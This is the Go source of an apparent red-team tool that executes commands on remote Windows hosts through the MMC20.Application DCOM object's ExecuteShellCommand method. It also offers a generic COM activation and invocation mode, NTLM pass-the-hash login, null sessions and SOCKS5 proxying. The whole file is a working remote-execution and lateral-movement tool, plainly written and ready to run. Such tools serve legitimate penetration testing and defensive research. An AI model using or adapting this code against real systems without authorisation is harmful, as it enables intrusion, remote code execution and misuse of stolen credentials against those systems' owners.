// MIT License
//
// # Copyright (c) 2026 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//
// MMC20.Application DCOM command execution via IDispatch automation.
// Reference: MMC Automation Object Model, [MS-OAUT]

package main

import (
	"context"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"golang.org/x/net/proxy"
	"golang.org/x/term"
	rundebug "runtime/debug"

	"github.com/jfjallid/go-smb/dcerpc"
	"github.com/jfjallid/go-smb/dcerpc/msdcom"
	"github.com/jfjallid/go-smb/gss"
	"github.com/jfjallid/go-smb/spnego"
	"github.com/jfjallid/golog"
)

var (
	log            = golog.Get("main")
	release string = "0.1.1"
)

// Well-known CLSID for MMC20.Application DCOM execution.
var CLSID_MMC20Application = mustGUID("49b2791a-b1ae-4c90-9b8e-e860ba07f889")

var helpMsg = `
    Usage: ` + os.Args[0] + ` [options]

    options:
          --host <target>          Hostname or ip address of remote server.
      -P, --port <int>             SMB Port (default 445)
      -d, --domain <name/fqdn>     Domain name to use for login
      -u, --user <string>          Username
      -p, --pass <string>          Password
      -n, --no-pass                Disable password prompt and send no credentials
          --hash <NT Hash>         Hex encoded NT Hash for user password
          --local                  Authenticate as a local user instead of domain user
          --null                   Attempt null session authentication
          --dns-host <ip:port>     Override system's default DNS resolver
          --dns-tcp                Force DNS lookups over TCP. Default true when using --socks-host
      -t, --timeout <duration>     Dial timeout specified in 5s, 1m, 10m format (default 5s)
      -c, --command <str>          Command to execute (MMC mode) or shell command (generic COM mode)
          --args <str>             Parameters passed to the command (MMC mode)
          --workdir <str>          Working directory for command
          --clsid <guid>           COM class GUID to activate (generic COM mode)
          --iid <guid>             Interface GUID to request (default: IID_IDispatch)
          --dispatch-name <str>    IDispatch method/property name (supports dot-chains, e.g. A.B.C)
          --dispatch-args <str>    Comma-separated typed arguments (prefix: s:string, i:int, b:bool; default: string)
          --opnum <int>            Raw opnum for non-IDispatch calls (reads hex stub data from stdin)
          --property-get           Use DISPATCH_PROPERTYGET instead of DISPATCH_METHOD
          --property-put           Use DISPATCH_PROPERTYPUT instead of DISPATCH_METHOD
          --quit                   Call Quit on the root object after execution (terminates server process, e.g. mmc.exe)
          --socks-host <target>    Establish connection via a SOCKS5 proxy server
          --socks-port <port>      SOCKS5 proxy port (default 1080)
          --noenc                  Disable RPC encryption
          --debug                  Enable debug logging. Bare --debug turns on every
                                   registered package; --debug=smb,dcerpc turns on only the
                                   listed package-name suffixes (the '=' form is required
                                   for the filter).
          --verbose                Enable verbose logging. Same filter syntax as --debug.
                                   --debug and --verbose may be combined with different
                                   filters; a package targeted by both gets the higher level.
          --list-log-packages      List the registered log package names that can be
                                   targeted with --debug=<suffix> or --verbose=<suffix>,
                                   then exit
      -v, --version                Show version
`

// logFlag is a comma-separated package-suffix filter that also remembers
// whether the user passed the flag at all. IsBoolFlag is set so the bare
// "--debug" and "--verbose" form parses (the flag pkg then calls Set("true"))
// — we treat "true" as "no filter, all packages on". A filter list requires
// the "=" form, e.g. --debug=smb,dcerpc, because IsBoolFlag stops the parser
// from consuming the next positional token.
type logFlag struct {
	set    bool
	values []string
}

func (d *logFlag) String() string { return strings.Join(d.values, ",") }

func (d *logFlag) IsBoolFlag() bool { return true }

func (d *logFlag) Set(s string) error {
	d.set = true
	d.values = nil
	if s == "" || s == "true" {
		return nil
	}
	for _, tok := range strings.Split(s, ",") {
		if tok = strings.TrimSpace(tok); tok != "" {
			d.values = append(d.values, tok)
		}
	}
	return nil
}

// applyLogLevel bumps registered package loggers to level. An empty filter
// matches every name returned by golog.Names(); a non-empty filter keeps only
// names whose path suffix matches one of the tokens (see matchesAny).
func applyLogLevel(level int, filter []string) {
	flags := golog.LstdFlags | golog.Lshortfile
	for _, name := range golog.Names() {
		if len(filter) == 0 || matchesAny(name, filter) {
			golog.Set(name, "", level, flags, nil, nil)
		}
	}
}

// matchesAny reports whether name equals any token or ends with "/"+token,
// so "smb" hits ".../go-smb/smb" but not ".../go-smb" (ends in "/go-smb",
// not "/smb") and not ".../smb/server" (ends in "/server").
func matchesAny(name string, tokens []string) bool {
	for _, t := range tokens {
		if name == t || strings.HasSuffix(name, "/"+t) {
			return true
		}
	}
	return false
}

// listLogPackages prints every registered log package name. The package
// loggers register themselves at import time, so golog.Names() here lists
// every logger this binary can target; the suffix of any of these names is
// what --debug=/--verbose= matches.
func listLogPackages() {
	names := golog.Names()
	sort.Strings(names)
	fmt.Println("Registered log packages (target a name's suffix with --debug=<suffix> or --verbose=<suffix>):")
	for _, name := range names {
		fmt.Println(name)
	}
}

// configureLogging applies the --debug / --verbose filters. The two are not
// mutually exclusive: each may carry its own comma-separated package filter
// (e.g. --debug=smb,dcerpc --verbose=main). Verbose is applied first and debug
// second so any package targeted by both ends up at the higher level
// (LevelDebug > LevelInfo). A bare --debug or --verbose (empty filter) targets
// every registered package, so passing both bare is ambiguous and rejected.
func configureLogging(debug, verbose logFlag) bool {
	if debug.set && verbose.set && len(debug.values) == 0 && len(verbose.values) == 0 {
		fmt.Println("Cannot enable both --debug and --verbose for all packages at once. Specify just one of them, or be more granular e.g. --debug=smb,dcerpc --verbose=main")
		return false
	}
	if verbose.set {
		applyLogLevel(golog.LevelInfo, verbose.values)
	}
	if debug.set {
		applyLogLevel(golog.LevelDebug, debug.values)
	}
	return true
}

func isFlagSet(name string) bool {
	found := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == name {
			found = true
		}
	})
	return found
}

func mustGUID(s string) [16]byte {
	g, err := msdcom.GUIDFromString(s)
	if err != nil {
		panic("invalid GUID: " + s + ": " + err.Error())
	}
	return g
}

// ExecuteMMC executes a command on a remote host via the MMC20.Application
// DCOM object. It uses IDispatch automation (GetIDsOfNames + Invoke) to
// navigate the MMC object model:
//
//	Application → Document → ActiveView → ExecuteShellCommand
//
// Each step requires resolving the property/method name to a numeric DISPID
// via GetIDsOfNames, then calling Invoke with that DISPID:
//
//   - Document: The console Document object representing the loaded snap-in
//     container. Retrieved as a property from the top-level Application.
//   - ActiveView: The View object for the active MMC window pane within
//     the Document. This is where shell execution is exposed.
//   - ExecuteShellCommand: A method on the View originally intended for
//     snap-ins to launch help files, but capable of executing any command.
//     Takes 4 BSTR arguments: command, directory, parameters, windowState.
//     The windowState is hardcoded to "7" (SW_SHOWMINNOACTIVE) since DCOM
//     commands run in the non-interactive Session 0 where window state has
//     no visible effect.
//
// After execution, Application.Quit is called to terminate the remote
// mmc.exe process and avoid leaving orphaned processes on the target.
// Quit causes the server to drop the connection, so all tracked object
// references are cleared to prevent RemRelease errors during Close.
func ExecuteMMC(conn *msdcom.DCOMConnection, command, directory, parameters string) error {
	app, err := conn.CreateInstance(CLSID_MMC20Application, msdcom.IID_IDispatch)
	if err != nil {
		return fmt.Errorf("create MMC20.Application: %w", err)
	}

	docDispID, err := app.GetIDsOfNames("Document")
	if err != nil {
		return fmt.Errorf("GetIDsOfNames(Document): %w", err)
	}
	log.Debugf("Document DISPID = %d", docDispID)

	doc, err := app.InvokeGetProperty(docDispID)
	if err != nil {
		return fmt.Errorf("Invoke(Document): %w", err)
	}

	viewDispID, err := doc.GetIDsOfNames("ActiveView")
	if err != nil {
		return fmt.Errorf("GetIDsOfNames(ActiveView): %w", err)
	}
	log.Debugf("ActiveView DISPID = %d", viewDispID)

	view, err := doc.InvokeGetProperty(viewDispID)
	if err != nil {
		return fmt.Errorf("Invoke(ActiveView): %w", err)
	}

	execDispID, err := view.GetIDsOfNames("ExecuteShellCommand")
	if err != nil {
		return fmt.Errorf("GetIDsOfNames(ExecuteShellCommand): %w", err)
	}
	log.Debugf("ExecuteShellCommand DISPID = %d", execDispID)

	err = view.InvokeMethodBSTR(execDispID, []string{command, directory, parameters, "7"})
	if err != nil {
		return fmt.Errorf("ExecuteShellCommand: %w", err)
	}

	// Quit the application to avoid leaving an orphaned mmc.exe process.
	// After Quit the server terminates and drops the connection, so clear
	// all tracked object refs to prevent RemRelease errors during Close.
	quitDispID, err := app.GetIDsOfNames("Quit")
	if err != nil {
		log.Debugf("GetIDsOfNames(Quit) failed: %v", err)
		return nil
	}

	if err := app.InvokeMethodBSTR(quitDispID, nil); err != nil {
		log.Debugf("Invoke(Quit) failed: %v", err)
	}

	conn.ClearObjectRefs()

	return nil
}

func runGenericCOM(conn *msdcom.DCOMConnection, clsidStr, iidStr, dispatchName, dispatchArgs string, opnum int, propertyGet, propertyPut, quit bool) error {
	clsidGUID, err := msdcom.GUIDFromString(clsidStr)
	if err != nil {
		return fmt.Errorf("invalid CLSID %q: %w", clsidStr, err)
	}

	iidGUID := msdcom.IID_IDispatch
	if iidStr != "" {
		iidGUID, err = msdcom.GUIDFromString(iidStr)
		if err != nil {
			return fmt.Errorf("invalid IID %q: %w", iidStr, err)
		}
	}

	log.Noticef("[*] Activating CLSID %s\n", clsidStr)
	obj, err := conn.CreateInstance(clsidGUID, iidGUID)
	if err != nil {
		return fmt.Errorf("CreateInstance: %w", err)
	}

	// Raw opnum mode
	if opnum >= 0 {
		log.Noticef("[*] Reading hex stub data from stdin for opnum %d...\n", opnum)
		stdinData, err := io.ReadAll(os.Stdin)
		if err != nil {
			return fmt.Errorf("read stdin: %w", err)
		}
		stubHex := strings.TrimSpace(string(stdinData))
		stubData, err := hex.DecodeString(stubHex)
		if err != nil {
			return fmt.Errorf("decode hex stub: %w", err)
		}
		result, err := obj.CallMethod(uint16(opnum), stubData)
		if err != nil {
			return fmt.Errorf("CallMethod(opnum=%d): %w", opnum, err)
		}
		log.Noticef("[+] Response (%d bytes):\n%s\n", len(result), hex.Dump(result))
		return nil
	}

	// IDispatch mode
	if dispatchName != "" {
		// Support dot-separated property chains (e.g., "Document.ActiveView.ExecuteShellCommand").
		// All segments except the last are traversed as DISPATCH_PROPERTYGET,
		// and the final segment uses the requested operation (method/get/put).
		rootObj := obj
		segments := strings.Split(dispatchName, ".")
		for _, seg := range segments[:len(segments)-1] {
			dispid, err := obj.GetIDsOfNames(seg)
			if err != nil {
				return fmt.Errorf("GetIDsOfNames(%q): %w", seg, err)
			}
			log.Noticef("[*] %s DISPID = %d\n", seg, dispid)
			obj, err = obj.InvokeGetProperty(dispid)
			if err != nil {
				return fmt.Errorf("InvokeGetProperty(%q): %w", seg, err)
			}
			log.Noticef("[*] Traversed %s -> IPID=%x\n", seg, obj.IPID())
		}

		finalName := segments[len(segments)-1]
		dispid, err := obj.GetIDsOfNames(finalName)
		if err != nil {
			return fmt.Errorf("GetIDsOfNames(%q): %w", finalName, err)
		}
		log.Noticef("[*] %s DISPID = %d\n", finalName, dispid)

		var invokeErr error
		if propertyGet {
			resultObj, err := obj.InvokeGetProperty(dispid)
			if err != nil {
				invokeErr = fmt.Errorf("InvokeGetProperty(%q): %w", finalName, err)
			} else {
				log.Noticef("[+] Got IDispatch object: IPID=%x\n", resultObj.IPID())
			}
		} else if propertyPut {
			typedArgs := parseTypedArgs(dispatchArgs)
			if err := obj.InvokePropertyPut(dispid, typedArgs); err != nil {
				invokeErr = fmt.Errorf("InvokePropertyPut(%q): %w", finalName, err)
			} else {
				log.Noticeln("[+] Property set successfully")
			}
		} else {
			typedArgs := parseTypedArgs(dispatchArgs)
			if err := obj.InvokeMethodTyped(dispid, typedArgs); err != nil {
				invokeErr = fmt.Errorf("InvokeMethod(%q): %w", finalName, err)
			} else {
				log.Noticeln("[+] Method invoked successfully")
			}
		}

		// Call Quit on the root Application object to terminate the
		// server process (e.g., mmc.exe). After Quit the server drops
		// the connection, so clear all tracked refs to prevent
		// RemRelease errors during Close.
		if quit {
			quitID, err := rootObj.GetIDsOfNames("Quit")
			if err != nil {
				log.Errorf("GetIDsOfNames(Quit) failed: %v", err)
			} else {
				log.Noticeln("[*] Calling Quit on root object...")
				if err := rootObj.InvokeMethodBSTR(quitID, nil); err != nil {
					log.Errorf("Invoke(Quit) failed: %v", err)
				} else {
					log.Noticeln("[+] Quit successful")
				}
			}
			conn.ClearObjectRefs()
		}

		return invokeErr
	}

	log.Noticef("[+] Object activated: IPID=%x IID=%x\n", obj.IPID(), obj.IID())
	return nil
}

// parseTypedArgs parses comma-separated typed arguments.
// Format: "s:hello,i:42,b:true" — prefix determines type (default: string).
func parseTypedArgs(s string) []msdcom.TypedArg {
	if s == "" {
		return nil
	}

	parts := strings.Split(s, ",")
	args := make([]msdcom.TypedArg, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}

		if len(p) > 2 && p[1] == ':' {
			switch p[0] {
			case 'i':
				v, err := strconv.ParseInt(p[2:], 10, 32)
				if err == nil {
					args = append(args, msdcom.TypedArg{VT: msdcom.VtI4, Int32: int32(v)})
					continue
				}
			case 'b':
				b, err := strconv.ParseBool(p[2:])
				if err == nil {
					args = append(args, msdcom.TypedArg{VT: msdcom.VtBool, Bool: b})
					continue
				}
			case 's':
				args = append(args, msdcom.TypedArg{VT: msdcom.VtBstr, BStr: p[2:]})
				continue
			}
		}
		args = append(args, msdcom.TypedArg{VT: msdcom.VtBstr, BStr: p})
	}
	return args
}

func main() {
	var host, username, password, hash, domain, socksHost, dnsHost string
	var command, cmdArgs, workdir, clsid, iid, dispatchName, dispatchArgs string
	var port, socksPort, opnum int
	var localUser, nullSession, version, noPass, dnsTCP, noenc, listLog bool
	var debug, verbose logFlag
	var propertyGet, propertyPut, quit bool
	var err error
	var dialTimeout time.Duration
	var dialSocksProxy proxy.Dialer

	flag.Usage = func() {
		fmt.Println(helpMsg)
		os.Exit(0)
	}

	flag.StringVar(&host, "host", "", "")
	flag.StringVar(&username, "u", "", "")
	flag.StringVar(&username, "user", "", "")
	flag.StringVar(&password, "p", "", "")
	flag.StringVar(&password, "pass", "", "")
	flag.StringVar(&hash, "hash", "", "")
	flag.StringVar(&domain, "d", "", "")
	flag.StringVar(&domain, "domain", "", "")
	flag.IntVar(&port, "P", 445, "")
	flag.IntVar(&port, "port", 445, "")
	flag.Var(&debug, "debug", "")
	flag.Var(&verbose, "verbose", "")
	flag.BoolVar(&listLog, "list-log-packages", false, "")
	flag.BoolVar(&localUser, "local", false, "")
	flag.BoolVar(&nullSession, "null", false, "")
	flag.DurationVar(&dialTimeout, "t", 5*time.Second, "")
	flag.DurationVar(&dialTimeout, "timeout", 5*time.Second, "")
	flag.BoolVar(&version, "v", false, "")
	flag.BoolVar(&version, "version", false, "")
	flag.StringVar(&socksHost, "socks-host", "", "")
	flag.IntVar(&socksPort, "socks-port", 1080, "")
	flag.BoolVar(&noPass, "no-pass", false, "")
	flag.BoolVar(&noPass, "n", false, "")
	flag.StringVar(&dnsHost, "dns-host", "", "")
	flag.BoolVar(&dnsTCP, "dns-tcp", false, "")
	flag.BoolVar(&noenc, "noenc", false, "")
	flag.StringVar(&command, "c", "", "")
	flag.StringVar(&command, "command", "", "")
	flag.StringVar(&cmdArgs, "args", "", "")
	flag.StringVar(&workdir, "workdir", "", "")
	flag.StringVar(&clsid, "clsid", "", "")
	flag.StringVar(&iid, "iid", "", "")
	flag.StringVar(&dispatchName, "dispatch-name", "", "")
	flag.StringVar(&dispatchArgs, "dispatch-args", "", "")
	flag.IntVar(&opnum, "opnum", -1, "")
	flag.BoolVar(&propertyGet, "property-get", false, "")
	flag.BoolVar(&propertyPut, "property-put", false, "")
	flag.BoolVar(&quit, "quit", false, "")

	flag.Parse()

	if listLog {
		listLogPackages()
		return
	}

	if !configureLogging(debug, verbose) {
		return
	}

	if version {
		fmt.Printf("Version: %s\n", release)
		bi, ok := rundebug.ReadBuildInfo()
		if !ok {
			log.Errorln("Failed to read build info to locate version imported modules")
		}
		for _, m := range bi.Deps {
			fmt.Printf("Package: %s, Version: %s\n", m.Path, m.Version)
		}
		return
	}

	// Validate format
	if isFlagSet("dns-host") {
		parts := strings.Split(dnsHost, ":")
		if len(parts) < 2 {
			if dnsHost != "" {
				dnsHost += ":53"
				parts = append(parts, "53")
				log.Infof("No port number specified for --dns-host so assuming port 53")
			} else {
				log.Errorln("invalid --dns-host")
				flag.Usage()
				return
			}
		}
		ip := net.ParseIP(parts[0])
		if ip == nil {
			log.Errorln("invalid --dns-host. Not a valid ip host address")
			flag.Usage()
			return
		}
		p, err := strconv.ParseUint(parts[1], 10, 32)
		if err != nil {
			log.Errorf("invalid --dns-host. Failed to parse port: %s", err)
			return
		}
		if p < 1 {
			log.Errorln("invalid --dns-host port number")
			flag.Usage()
			return
		}
	}

	if socksHost != "" && socksPort < 1 {
		log.Errorln("invalid --socks-port")
		flag.Usage()
		return
	}

	var hashBytes []byte

	if host == "" {
		log.Errorln("must specify a hostname or ip using --host")
		flag.Usage()
		return
	}

	if dialTimeout < time.Second {
		log.Errorln("valid value for the timeout is >= 1 seconds")
		return
	}

	if command == "" && clsid == "" {
		log.Errorln("either --command or --clsid is required")
		flag.Usage()
		return
	}

	if propertyGet && propertyPut {
		log.Errorln("--property-get and --property-put are mutually exclusive")
		return
	}

	if hash != "" {
		hashBytes, err = hex.DecodeString(hash)
		if err != nil {
			log.Errorf("failed to decode hash: %s", err)
			return
		}
	}

	if noPass {
		password = ""
		hashBytes = nil
	} else {
		if (password == "") && (hashBytes == nil) {
			if (username != "") && (!nullSession) {
				if !isFlagSet("p") && !isFlagSet("pass") {
					fmt.Printf("Enter password: ")
					passBytes, err := term.ReadPassword(int(os.Stdin.Fd()))
					fmt.Println()
					if err != nil {
						log.Errorln(err)
						return
					}
					password = string(passBytes)
				}
			}
		}
	}

	if dnsHost != "" {
		protocol := "udp"
		if dnsTCP {
			protocol = "tcp"
		}
		net.DefaultResolver = &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				d := net.Dialer{
					Timeout: dialTimeout,
				}
				return d.DialContext(ctx, protocol, dnsHost)
			},
		}
	}

	authLevel := dcerpc.RpcAuthnLevelPktPrivacy
	if noenc {
		authLevel = dcerpc.RpcAuthnLevelPktIntegrity
	}
	opts := msdcom.DCOMOptions{
		AuthLevel: authLevel,
		Timeout:   dialTimeout,
	}

	if socksHost != "" {
		dialSocksProxy, err = proxy.SOCKS5("tcp", fmt.Sprintf("%s:%d", socksHost, socksPort), nil, proxy.Direct)
		if err != nil {
			log.Errorln(err)
			return
		}
		opts.Dialer = func(addr string) (net.Conn, error) {
			return dialSocksProxy.Dial("tcp", addr)
		}
	}

	if !nullSession {
		opts.MechFactory = func() gss.Mechanism {
			return &spnego.NTLMInitiator{
				User:      username,
				Password:  password,
				Hash:      hashBytes,
				Domain:    domain,
				LocalUser: localUser,
			}
		}
	}

	log.Noticef("[*] Connecting to %s via DCOM...\n", host)
	conn, err := msdcom.NewDCOMConnection(host, opts)
	if err != nil {
		log.Errorf("DCOM connection failed: %s", err)
		return
	}
	defer conn.Close()

	// Generic COM mode
	if clsid != "" {
		if err := runGenericCOM(conn, clsid, iid, dispatchName, dispatchArgs, opnum, propertyGet, propertyPut, quit); err != nil {
			log.Errorf("%s", err)
			return
		}
		log.Noticeln("[+] Done")
		return
	}

	// MMC20.Application mode
	if err := ExecuteMMC(conn, command, workdir, cmdArgs); err != nil {
		log.Errorf("MMC exec failed: %s", err)
		return
	}
	log.Noticeln("[+] Command executed successfully")
}
